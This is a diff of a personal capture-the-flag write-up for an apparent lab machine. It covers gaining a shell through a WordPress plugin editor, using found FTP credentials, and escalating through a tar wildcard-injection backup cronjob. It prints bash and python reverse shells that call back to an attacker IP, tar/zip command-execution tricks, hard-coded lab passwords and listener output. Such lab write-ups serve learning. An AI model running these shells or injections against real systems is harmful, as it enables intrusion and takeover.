@@ -152,7 +152,8 @@ Akismet Anti-Spam
 Hello Dolly
 
 We are able to overwrite Akismet Anti-Spam with php-reverse-shell.php using the
-plugin editor. Are we able to execute it as well?
+plugin editor. Are we able to execute it as well? Not really, and it seemed
+to have dissappeared from the list of plugins.
 
 Well, pasting the reverse shell into the Dolly-plugin seems to have broken the
 admin site slightly, so I'll restart the target machine.
@@ -167,15 +168,14 @@ Instead, I had to do:
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.14.21.85/4444 0>&1'");
 
 Although, the commnands I tried to execute through the first reverse shell did
-execute when I connected using the second one, so it seems to have "worked"
-somewhat.
+execute/were flushed  when I connected using the second one, so it seems to have
+"worked" somewhat.
 
 I need to spend some time reading up on the difference between shell_exec()
 and exec() as well as "bash -c".
 
 But for now, we have a reverse shell, so lets go through the usual process of
-stabilizing it. python doesn't seem to exist on this machine, but we can still
-follow the other steps and get to some kind of stable.
+stabilizing it.
 
 I found an interesting file:
 www-data@Jeff:/var/www/html$ cat ftp_backup.php
@@ -259,3 +259,141 @@ print(ftp.getwelcome())
 
 My idea is to explore the ftp directory, and perhaps upload a reverse shell,
 but that is a task for tomorrow.
+
+Next day!
+
+python was a bit cumbersome to use with that shell, so lets try curl
+
+The following command didn't work, just froze:
+curl --user backupmgr:SuperS1ckP4ssw0rd123! --list-only ftp://172.20.0.1/
+
+One of the walkthoughs mentioned something about disabling passive mode, here
+we can read about that in more detail:
+https://daniel.haxx.se/blog/2020/02/26/curl-ootw-ftp-pasv/
+
+So lets try adding --ftp-port to curl. The - after --ftp-port tells curl to use
+the same address as is used for the control connection
+$ curl --user backupmgr:SuperS1ckP4ssw0rd123! --list-only --ftp-port - ftp://172.20.0.1/
+files
+
+Let's see what is in files:
+$ curl --user backupmgr:SuperS1ckP4ssw0rd123! --list-only --ftp-port - ftp://172.20.0.1/files/
+
+Nothing. What if we upload a file to it?
+$ curl --user backupmgr:SuperS1ckP4ssw0rd123! --upload-file /tmp/test.txt --ftp-port - ftp://172.20.0.1/files/
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    10    0     0  100    10      0    333 --:--:-- --:--:-- --:--:--   357
+
+Seems to have worked fine. Let's see if it is there:
+$ curl --user backupmgr:SuperS1ckP4ssw0rd123! --list-only --ftp-port - ftp://172.20.0.1/files/
+test.txt
+
+Sweet! Now we have at least a way of affecting the host machine.
+
+In one of the walkthroughs, the author reasons that a common way of handling a
+backed up directory is to compress it and store it away using a cronjob. (paraphrasing)
+
+We can read more about this here:
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
+
+Common tools to do this with would be stuff like zip, gzip, bzip2 or tar to name a few.
+By looking at gtfobins we find that we have a few different methods depeding on
+the tool. The most straight forward seems to be zip and tar, since we can actualy
+execute commands. 
+
+# --checkpoint=1 displays a progress message, --checkpoint-action
+tar: tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+# -T tests the integrity of the zip-file, and -TT specifies the argument to use
+# when testing it
+zip: zip $(mktemp -u) /etc/hosts -T -TT 'sh #'
+
+In our case, we would want another reverse shell, so the command to execute would
+be:
+/bin/bash -c '/bin/bash -i >& /dev/tcp/IP/PORT 0>&1'
+
+The tar exploit depends on the wildcard expanding to
+tar xvvfz * -> tar xvvfz --checkpoint=1 --checkpoint-action=exec=shell.sh
+
+In other words, if we can place files in the directory names "--checkpoint=1" and
+"--checkpoint-action=exec=shell.sh" we should be able to get a reverse shell.
+
+We create files named "--checkpoint=1" and "--checkpoint-action=exec=sh shell.sh"
+and also the file shell.sh with the bash reverse shell and upload them to the ftp
+server with the curl command specified earlier. Remember to start a  nc listener.
+
+$ echo "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.14.21.85/4242 0>&1'" > shell.sh
+$ echo "" > /tmp/--checkpoint=1
+$ echo "" > --checkpoint-action=exec=sh\ shell.sh
+$ curl --user backupmgr:SuperS1ckP4ssw0rd123! --upload-file /tmp/--checkpoint-action\=exec\=sh\ shell.sh --ftp-port - ftp://172.20.0.1/files/
+
+$ curl --user backupmgr:SuperS1ckP4ssw0rd123! --list-only --ftp-port - ftp://172.20.0.1/files/
+curl --user backupmgr:SuperS1ckP4ssw0rd123! --list-only --ftp-port - ftp://172.20.0.1/files/
+--checkpoint-action=exec=sh shell.sh
+--checkpoint=1
+shell.sh
+
+And we get a reverse shell on our listener:
+$ nc -lvnp 4242
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::4242
+Ncat: Listening on 0.0.0.0:4242
+Ncat: Connection from 10.10.106.152.
+Ncat: Connection from 10.10.106.152:56300.
+bash: cannot set terminal process group (3419): Inappropriate ioctl for device
+bash: no job control in this shell
+backupmgr@tryharder:~/.ftp/files$ id
+uid=1001(backupmgr) gid=1001(backupmgr) groups=1001(backupmgr)
+
+$ ps aux tells us that a ssh server is running:
+root      1111  0.0  0.2  72300  5812 ?        Ss   08:12   0:00 /usr/sbin/sshd -D
+
+and we can also see the docker command:
+root      1595  0.0  0.1 478532  3480 ?        Sl   08:12   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8080 -container-ip 172.20.0.6 -container-port 80
+
+Unfortunately, we can't seem to login via ssh as backupmgr (from /etc/ssh/sshd_config):
+DenyUsers backupmgr
+
+So we are stuch in the reverse shell a little while longer.
+
+Let's see if we can privilege escalate.
+
+#################################
+# PRIVELEGE ESCALATION @tryharder
+#################################
+In backupmgr:s home directory we find some interesting files:
+backupmgr@tryharder:~$ ls -la
+ls -la
+total 44
+drwxr-xr-x 2 backupmgr backupmgr 4096 May 18  2020 .scripts
+drwxr-xr-x 2 backupmgr backupmgr 4096 Aug 20 10:30 .tmp
+
+backupmgr@tryharder:~$ ls -lh /home/backupmgr/.scripts
+ls -lh /home/backupmgr/.scripts
+total 4.0K
+-rwxr-xr-x 1 backupmgr backupmgr 116 May 18  2020 backup.sh
+
+backupmgr@tryharder:~$ cat /home/backupmgr/.scripts/backup.sh
+cd /home/backupmgr/.ftp/files
+rm /home/backupmgr/.tmp/backup.tar.gz
+tar -czvf /home/backupmgr/.tmp/backup.tar.gz *
+
+backupmgr@tryharder:~$ ls -lh /home/backupmgr/.tmp
+total 8.0K
+-rw-rw-r-- 1 backupmgr backupmgr 215 Aug 20 10:31 backup.tar.gz
+-rw-r--r-- 1 root      root      224 May 11  2020 script.sh
+
+backupmgr@tryharder:~$ cat /home/backupmgr/.tmp/script.sh
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.12",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+It looks like this script connects to 10.0.2.12 and spawns a shell.
+
+One thought is python library hijacking.
+
+linpeas.sh shows that it is vulnerable to CVE-2021-3043, and I am able to get a
+root shell using that, but I'm more interested in trying to escalate to jeff first.
+
+We have some more stuff to look into, the python library hijack, files owned by
+jeff, linpeas found /etc/vsftpd.conf.bak so maybe the ftp server have some holes
+in its configuration. But lets pause it for now.
